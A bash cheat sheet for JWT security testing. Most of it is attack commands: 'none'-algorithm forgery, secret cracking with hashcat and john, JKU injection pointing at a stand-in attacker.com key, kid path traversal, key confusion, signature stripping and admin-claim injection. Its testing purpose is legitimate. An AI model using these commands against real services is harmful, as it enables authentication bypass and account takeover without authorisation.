#!/bin/bash
# ==============================================
# JWT SECURITY TESTING CHEAT SHEET
# ==============================================

# 1. BASIC INSPECTION
# -------------------

# Decode JWT (no verification)
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# Online Decoder:
# https://jwt.io/

# 2. COMMON VULNERABILITIES
# ------------------------

# 2.1 None Algorithm Attack
jwt_tool eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ. -X a

# 2.2 Weak Secret Cracking
john --wordlist=rockyou.txt jwt_hash.txt
hashcat -m 16500 jwt.txt rockyou.txt

# 2.3 JKU/JWK Injection
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -I -hc jku -hv "http://attacker.com/key.json"

# 2.4 Kid Parameter Manipulation
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -I -hc kid -hv "../../../../dev/null"

# 3. TOOLING
# ----------

# 3.1 jwt_tool (Swiss Army Knife)
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -T

# Common jwt_tool flags:
# -T: Tamper with the token
# -X: Exploit specific vulnerability (a=alg:none, k=key confusion, etc.)
# -I: Inject claims
# -pc: Add public claim
# -pv: Add private claim

# 3.2 Crack JWT with Hashcat
# First convert JWT to hash format:
python3 jwt2hashcat.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Then run hashcat:
hashcat -a 0 -m 16500 jwt.hash rockyou.txt

# 4. ADVANCED TECHNIQUES
# ----------------------

# 4.1 Key Confusion Attack (RS256 to HS256)
jwt_tool eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9... -X k -pk public.pem

# 4.2 Signature Stripping
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0." http://target.com/api

# 4.3 Claim Injection
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -I -pc name -pv "admin"

# 5. VALIDATION TESTING
# --------------------

# 5.1 Expiration Check
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -C -np "exp:9999999999"

# 5.2 Issuer Check Bypass
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -I -pc iss -pv "attacker.com"

# 6. AUTOMATED SCANNING
# --------------------

# 6.1 Nuclei Templates
nuclei -t ~/nuclei-templates/jwt/ -u https://target.com -o jwt_scan.txt

# 6.2 Burp Suite JWT Scanner
# Available in BApp Store

# 7. MITIGATION TESTING
# --------------------

# 7.1 Verify Signature Check
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... -V -pk public.pem

# 7.2 Check Algorithm Enforcement
jwt_tool eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0... -V

# ==============================================
# TIPS:
# 1. Always check for "none" algorithm support
# 2. Test for weak HMAC secrets
# 3. Verify all claims are properly validated
# 4. Check for insecure header parameters (jku, jwk, kid)
# ==============================================

# RECOMMENDED WORDLISTS:
# ----------------------
# /usr/share/wordlists/jwt/secrets.txt
# /usr/share/wordlists/rockyou.txt
# /usr/share/wordlists/jwt/common_jwks.txt

# INSTALLATION:
# -------------
# jwt_tool: pip install jwt-tool
# john: sudo apt install john
# hashcat: sudo apt install hashcat
# jwt2hashcat: https://github.com/Sjord/jwtcrack/blob/master/jwt2hashcat.py

# Recommended Tools to Install:
# jwt_tool - Swiss army knife for JWT testing
# JohnTheRipper - Password cracker
# Hashcat - Advanced password recovery
# jwt2hashcat - Convert JWT to hashcat format